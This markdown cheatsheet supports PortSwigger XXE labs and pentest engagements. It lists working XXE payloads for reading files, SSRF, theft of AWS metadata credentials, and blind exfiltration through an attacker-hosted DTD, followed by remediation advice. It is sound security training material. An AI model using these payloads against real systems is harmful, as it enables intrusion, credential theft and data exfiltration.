# 06 — XXE Cheatsheet and PortSwigger Lab Mapping

A condensed, standing reference. Keep this file open during labs or engagements.

## Quick-Reference Payload Cheatsheet

### 1. Classic file read (in-band)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
General entity, `SYSTEM` + `file://` path, reflected via `&xxe;`. See file 2.

### 2. SSRF via external entity

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal-host/"> ]>
```
Same mechanic, `http://` scheme instead of `file://`. See file 4.

### 3. Cloud metadata abuse (AWS IMDSv1 example)

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```
Then re-request with the returned role name appended to the path. See file 4.
Check for IMDSv2 enforcement first — it blocks this simple GET-based chain.

### 4. XInclude (when you don't control the whole document)

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```
`parse="text"` is mandatory for non-XML target files. See file 2.

### 5. Blind XXE — OOB detection

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://COLLABORATOR-ID.oastify.com/"> ]>
```
Just confirms resolution happened; exfiltrates nothing by itself. See file 3.

### 6. Blind XXE — OOB exfiltration (parameter-entity chain)

External DTD (`evil.dtd`) hosted on attacker infrastructure:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER/?x=%file;'>">
%eval;
%exfil;
```
Application-facing payload:
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd"> %xxe; ]>
```
`file` reads locally → `eval` builds a new entity string → `exfil` triggers the
outbound request carrying the data. See file 3 for the full breakdown of why `&#x25;`
is required instead of a literal `%`.

### 7. Blind XXE — error-based exfiltration

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
Forces a "file not found" error whose message includes the stolen content. See file 3.

### 8. Repurposing a local DTD (egress-filtered targets)

```xml
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; xxe SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; error "<!ENTITY &#x26;#x25; trigger SYSTEM \'file:///nonexistent/&#x25;xxe;\'>">
  '>
  %local_dtd;
]>
```
Redefines an entity from a DTD already present on disk; no outbound network needed.
See file 3.

### 9. SVG-based XXE via file upload

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="128" height="128">
  <text x="0" y="16">&xxe;</text>
</svg>
```
Upload as a `.svg` file rather than modifying any HTTP request body. See file 2.

## Defense / Remediation Quick Reference

In an engagement report, the remediation is consistently one of these, regardless of
which technique above was demonstrated:

- Disable DTD processing entirely where the application doesn't need it (most XML
  libraries expose a single flag for this, e.g. `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` in Java).
- If DTDs must be supported, explicitly disable resolution of external general and
  parameter entities, and disable `XInclude` support.
- Apply this hardening at the lowest-level shared parser configuration/factory used by
  the application, not per-endpoint — a single missed endpoint reusing the same
  vulnerable default configuration re-introduces the bug.
- Treat any library that parses XML-based file formats on upload (SVG, DOCX, XLSX) with
  the same hardening — file-upload-triggered XXE (file 2, Technique 4) is frequently
  missed because teams patch their "API" XML parsing but forget the file-processing
  pipeline uses a separate, differently-configured parser.

## PortSwigger Web Security Academy — Lab Mapping (Correct Academy Order)

Labs below are listed in the exact order they appear in the Academy's XXE injection
topic, progressing Apprentice → Practitioner → Expert.

| # | Difficulty | Lab Name | Technique / File |
|---|---|---|---|
| 1 | Apprentice | Exploiting XXE using external entities to retrieve files | Classic in-band file read — File 2, Technique 1 |
| 2 | Apprentice | Exploiting XXE to perform SSRF attacks | XXE-to-SSRF basic — File 4, Technique 1 |
| 3 | Practitioner | Blind XXE with out-of-band interaction | Blind OOB detection — File 3, Step 1 |
| 4 | Practitioner | Blind XXE with out-of-band interaction via XML parameter entities | Blind OOB exfiltration chain — File 3, Step 2 |
| 5 | Practitioner | Exploiting blind XXE to exfiltrate data using error messages | Error-based exfiltration — File 3, Step 3 |
| 6 | Practitioner | Exploiting XInclude to retrieve files | XInclude attack — File 2, Technique 3 |
| 7 | Practitioner | Exploiting XXE via image file upload | SVG/file-upload XXE — File 2, Technique 4 |
| 8 | Expert | Exploiting XXE to retrieve data by repurposing a local DTD | Local DTD repurposing — File 3, Real-World Note |

### Notes on Progression Logic

- Labs 1–2 (Apprentice) establish the baseline mechanic: define an external entity,
  reference it in reflected data. Lab 2 is identical mechanically to Lab 1 — only the
  URI scheme changes from `file://` to `http://`, which is exactly why SSRF is
  introduced immediately after classic file read rather than much later: it reinforces
  that XXE and SSRF are the same primitive with a different target.
- Labs 3–5 (Practitioner) escalate purely in *blindness*: Lab 3 confirms the building
  block (OOB interaction) without exfiltration, Lab 4 builds the full parameter-entity
  exfiltration chain on top of it, and Lab 5 swaps the exfiltration channel from
  network callback to parser error text when OOB isn't available.
- Labs 6–7 (Practitioner) shift focus from "how do I get data out" to "where else can I
  even find an injection point" — XInclude when you don't control the whole document,
  and file upload when there's no XML-looking traffic at all.
- Lab 8 (Expert) is the hardest because it combines several earlier concepts at once:
  parameter entities, error-based exfiltration, *and* the added constraint of zero
  outbound network access, forcing the local-DTD-repurposing technique.

## Recommended Practice Order

Work through the labs in the table order above — it mirrors both the Academy's own
difficulty rating and the logical teaching order used across files 2–3 of this series.
Attempt each lab manually first using the relevant technique file before reaching for
XXEinjector (file 5); the manual repetition is what makes the parameter-entity chain
mechanics (file 3) intuitive enough to adapt on a real, unfamiliar target where no
write-up exists.
